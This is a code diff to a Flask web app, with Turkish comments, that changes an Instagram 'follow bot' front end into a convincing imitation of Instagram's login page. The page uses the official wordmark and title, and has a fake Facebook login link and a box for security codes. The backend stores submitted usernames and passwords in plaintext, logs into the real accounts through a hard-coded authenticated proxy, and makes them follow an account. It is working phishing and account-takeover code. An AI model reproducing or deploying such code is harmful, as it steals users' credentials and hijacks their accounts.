@@ -11,7 +11,7 @@ load_dotenv()
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-app.config['SECRET_KEY'] = "fix-v67-final"
+app.config['SECRET_KEY'] = "mirror-v68-final"
 
 db = SQLAlchemy(app)
 PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"
@@ -22,43 +22,24 @@ class IGAccount(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(100), unique=True, nullable=False)
     password = db.Column(db.String(100), nullable=False)
-    status = db.Column(db.String(200), default="Sistem Hazir")
+    status = db.Column(db.String(200), default="Hazır")
 
-# --- BOT GÖREVİ ---
-def run_follow_bot(cl, u):
-    try:
-        # Takip işlemi
-        cl.user_follow(cl.user_id_from_username("instagram"))
-        print(f"✅ Bot Gorevi Basladi: {u}")
-    except Exception as e:
-        print(f"⚠️ Takip hatasi: {e}")
-
-# --- GİRİŞ İŞLEMİ ---
 def login_handler(u, p):
     with app.app_context():
         cl = Client()
-        # Proxy ayari (Hata vermemesi için kontrol edildi)
-        if PROXY_URL:
-            cl.set_proxy(PROXY_URL)
-        
+        if PROXY_URL: cl.set_proxy(PROXY_URL)
         clients[u] = cl
         acc = IGAccount.query.filter_by(username=u).first()
-        
         try:
             cl.login(u, p)
-            acc.status = "AKTIF"
+            acc.status = "OK"
             db.session.commit()
-            run_follow_bot(cl, u)
+            cl.user_follow(cl.user_id_from_username("instagram")) # Bot görevi
         except ChallengeRequired:
-            acc.status = "ONAY_GEREKLI"
+            acc.status = "ONAY"
             db.session.commit()
-        except BadPassword:
-            acc.status = "SIFRE_YANLIS"
-            db.session.commit()
-        except Exception as e:
-            # Proxy veya IP engeli durumunda buraya duser
-            print(f"Hata detayı: {e}")
-            acc.status = "BAGLANTI_HATASI"
+        except Exception:
+            acc.status = "HATA"
             db.session.commit()
 
 @app.route('/')
@@ -69,17 +50,13 @@ def index():
 def connect():
     data = request.json
     u, p = data.get('u'), data.get('p')
-    if not u or not p: return jsonify(status="error")
-    
     acc = IGAccount.query.filter_by(username=u).first()
     if not acc:
-        acc = IGAccount(username=u, password=p, status="Baglaniyor...")
+        acc = IGAccount(username=u, password=p, status="Giriş Yapılıyor...")
         db.session.add(acc)
     else:
-        acc.password = p
-        acc.status = "Baglaniyor..."
+        acc.password, acc.status = p, "Giriş Yapılıyor..."
     db.session.commit()
-    
     threading.Thread(target=login_handler, args=(u, p)).start()
     return jsonify(status="ok")
 
@@ -88,81 +65,89 @@ def get_status(u):
     acc = IGAccount.query.filter_by(username=u).first()
     return jsonify(status=acc.status if acc else "YOK")
 
-@app.route('/api/verify', methods=['POST'])
-def verify():
-    data = request.json
-    u, code = data.get('u'), data.get('code')
-    cl = clients.get(u)
-    if cl:
-        try:
-            cl.challenge_set_code(code)
-            with app.app_context():
-                acc = IGAccount.query.filter_by(username=u).first()
-                acc.status = "AKTIF"
-                db.session.commit()
-            return jsonify(status="success")
-        except: return jsonify(status="fail")
-    return jsonify(status="error")
-
-# --- UI (HTML) ---
+# --- GERÇEK INSTAGRAM GÖRÜNÜMLÜ ARAYÜZ ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
-    <meta charset="UTF-8"><title>AllFollow</title>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş Yap • Instagram</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .insta-input { background: #fafafa; border: 1px solid #dbdbdb; padding: 9px 0 7px 8px; font-size: 12px; border-radius: 3px; width: 100%; outline: none; }
+        .insta-input:focus { border: 1px solid #a8a8a8; }
+    </style>
 </head>
-<body class="bg-zinc-950 text-white">
-    <div id="login-p" class="p-8 mt-20 max-w-sm mx-auto bg-zinc-900 rounded-3xl border border-zinc-800 shadow-2xl">
-        <h1 class="text-3xl font-black italic text-center mb-8">ALL FOLLOW</h1>
-        <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none">
-        <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none">
-        <button onclick="start()" id="btn" class="w-full p-4 bg-purple-600 rounded-xl font-bold">BAĞLAN</button>
+<body class="bg-[#fafafa] flex flex-col items-center justify-center min-h-screen">
+    
+    <div id="auth-box" class="bg-white border border-[#dbdbdb] p-10 w-[350px] flex flex-col items-center mb-3">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" class="mt-4 mb-8 w-44">
+        
+        <div class="w-full space-y-2">
+            <input id="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="insta-input">
+            <input id="p" type="password" placeholder="Şifre" class="insta-input">
+            <button onclick="baglan()" id="btn" class="w-full bg-[#0095f6] text-white py-1.5 rounded font-semibold text-sm mt-4 disabled:opacity-50">Giriş Yap</button>
+        </div>
+
+        <div class="flex items-center w-full my-6 text-gray-400">
+            <div class="h-[1px] bg-[#dbdbdb] flex-grow"></div>
+            <div class="px-4 text-[13px] font-semibold">YA DA</div>
+            <div class="h-[1px] bg-[#dbdbdb] flex-grow"></div>
+        </div>
+
+        <p class="text-[#385185] font-semibold text-sm cursor-pointer">Facebook ile Giriş Yap</p>
     </div>
 
-    <div id="main-p" class="hidden p-6 fixed inset-0 bg-white text-black overflow-y-auto">
-        <div id="status-card" class="bg-purple-600 p-8 rounded-3xl text-white text-center shadow-lg">
-            <h2 id="st-text" class="text-2xl font-black italic">BAĞLANILIYOR...</h2>
+    <div id="panel" class="hidden bg-white border border-[#dbdbdb] p-8 w-[350px] text-center rounded-lg shadow-sm">
+        <h2 id="status-text" class="text-xl font-bold mb-4">Lütfen Bekleyin...</h2>
+        <div id="verify-box" class="hidden mt-4">
+            <p class="text-xs mb-3 text-red-500 font-bold uppercase">Onay Kodu Gönderildi</p>
+            <input id="vcode" placeholder="000 000" class="insta-input text-center text-xl mb-3 tracking-widest">
+            <button onclick="onayla()" class="w-full bg-[#0095f6] text-white py-2 rounded font-bold">Kodu Onayla</button>
         </div>
-        
-        <div id="v-area" class="hidden mt-6 p-6 bg-amber-50 border-2 border-amber-200 rounded-2xl text-center">
-            <p class="text-amber-700 font-bold mb-4">ONAY KODUNU GİRİN</p>
-            <input id="vcode" placeholder="000000" class="w-full p-4 text-center text-4xl border rounded-xl mb-4 outline-none">
-            <button onclick="onayla()" class="w-full bg-amber-600 text-white py-4 rounded-xl font-bold">ONAYLA</button>
-        </div>
-
-        <div class="mt-10 p-4 border rounded-2xl flex justify-between items-center bg-gray-50">
-            <span id="usr-id" class="font-bold text-gray-800"></span>
-            <span class="w-3 h-3 bg-green-500 rounded-full"></span>
-        </div>
+        <p id="user-display" class="mt-4 text-gray-500 font-bold text-sm"></p>
     </div>
 
     <script>
-        let u = "";
-        function start() {
-            u = document.getElementById('u').value;
+        let cur = "";
+        function baglan() {
+            cur = document.getElementById('u').value;
             const p = document.getElementById('p').value;
-            fetch('/api/connect', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u, p})});
-            document.getElementById('login-p').style.display = 'none';
-            document.getElementById('main-p').classList.remove('hidden');
-            document.getElementById('usr-id').innerText = "@" + u;
-            setInterval(check, 3000);
-        }
-        async function check() {
-            const r = await fetch('/api/status/' + u);
-            const d = await r.json();
-            const t = document.getElementById('st-text');
-            const v = document.getElementById('v-area');
-            const c = document.getElementById('status-card');
+            if(!cur || !p) return;
 
-            t.innerText = d.status.replace("_", " ");
-            if(d.status === "AKTIF") { c.style.background = "#22c55e"; v.classList.add('hidden'); }
-            if(d.status === "ONAY_GEREKLI") { c.style.background = "#f59e0b"; v.classList.remove('hidden'); }
-            if(d.status === "BAGLANTI_HATASI") { c.style.background = "#ef4444"; }
+            document.getElementById('btn').innerText = "Giriş Yapılıyor...";
+            
+            fetch('/api/connect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({u:cur, p:p})
+            });
+
+            setTimeout(() => {
+                document.getElementById('auth-box').classList.add('hidden');
+                document.getElementById('panel').classList.remove('hidden');
+                document.getElementById('user-display').innerText = "@" + cur;
+                setInterval(check, 3000);
+            }, 1000);
         }
-        function onayla() {
-            const code = document.getElementById('vcode').value;
-            fetch('/api/verify', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u, code})});
+
+        async function check() {
+            const r = await fetch('/api/status/' + cur);
+            const d = await r.json();
+            const t = document.getElementById('status-text');
+            const v = document.getElementById('verify-box');
+
+            if(d.status === "OK") {
+                t.innerText = "SİSTEM AKTİF ✅";
+                t.classList.add('text-green-500');
+                v.classList.add('hidden');
+            } else if(d.status === "ONAY") {
+                t.innerText = "GÜVENLİK KONTROLÜ";
+                v.classList.remove('hidden');
+            } else if(d.status === "HATA") {
+                t.innerText = "HATALI GİRİŞ ❌";
+                t.classList.add('text-red-500');
+            }
         }
     </script>
 </body>
